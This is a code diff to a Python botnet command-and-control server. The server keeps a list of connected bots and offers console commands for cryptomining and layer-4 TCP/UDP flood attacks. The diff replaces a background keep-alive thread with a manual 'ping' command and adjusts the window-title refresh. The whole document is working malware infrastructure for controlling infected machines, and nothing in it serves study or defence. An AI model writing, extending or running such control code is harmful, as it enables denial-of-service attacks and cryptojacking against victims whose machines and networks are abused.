@@ -13,7 +13,6 @@ port = 65535
 web_port = 4444
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
 s.bind((host, port))
 
 clients = []
@@ -53,6 +52,7 @@ banner = """
 
 help_menu = """\033[90m
   -/-\033[35m help \033[90m      -/-
+  -/-\033[35m ping \033[90m      -/-
   -/-\033[35m bots \033[90m      -/-
   -/-\033[35m stat \033[90m      -/-
   -/-\033[35m clear \033[90m     -/-
@@ -71,8 +71,6 @@ methods = """\033[90m
 """
 
 
-print(banner)
-
 if sys.platform == "linux":
     import pwd
 
@@ -81,6 +79,7 @@ else:
     username = os.getlogin()
 
 hostname = socket.gethostname()
+os.chdir(os.getcwd())
 
 local = f"\033[35m[\033[90m{username}@{hostname} \033[90m~\033[35m]\033[96m$ \033[0m"
 remote = local.replace(hostname, "Remote")
@@ -98,21 +97,7 @@ def title():
     while True:
         if sys.platform != "linux":
             os.system(f"title bots: {len(clients)}")
-            time.sleep(5)
-
-
-def ping():
-    while True:
-        time.sleep(5)
-
-        if len(clients) > 0:
-            for client in clients:
-                try:
-                    client.sendall(b'ping')
-                    client.recv(1024)
-
-                except ConnectionError:
-                    clients.remove(client)
+            time.sleep(1)
 
 
 def get_host_info(client):
@@ -152,9 +137,6 @@ def app_run():
 t = threading.Thread(target=listen)
 t.start()
 
-t = threading.Thread(target=ping)
-t.start()
-
 t = threading.Thread(target=title)
 t.start()
 
@@ -181,6 +163,16 @@ def server():
 
         elif console in ["stat", "miner", "l4 tcp", "l4 udp", "l4 tcp stop", "l4 udp stop", "disconnect"]:
             print("\033[31m[-]\033[0m You are not connected\n")
+
+        elif console == "ping":
+            if len(clients) > 0:
+                for client in clients:
+                    try:
+                        client.sendall(b'ping')
+                        client.recv(1024)
+
+                    except ConnectionError:
+                        clients.remove(client)
 
         # Remote
         elif console == "connect":
@@ -220,6 +212,16 @@ def server():
 
                             elif data == "Inactive":
                                 print("\033[31mInactive\033[0m")
+
+                    elif console == "ping":
+                        if len(clients) > 0:
+                            for client in clients:
+                                try:
+                                    client.sendall(b'ping')
+                                    client.recv(1024)
+
+                                except ConnectionError:
+                                    clients.remove(client)
 
                     # Miner
                     elif console == "miner stop":
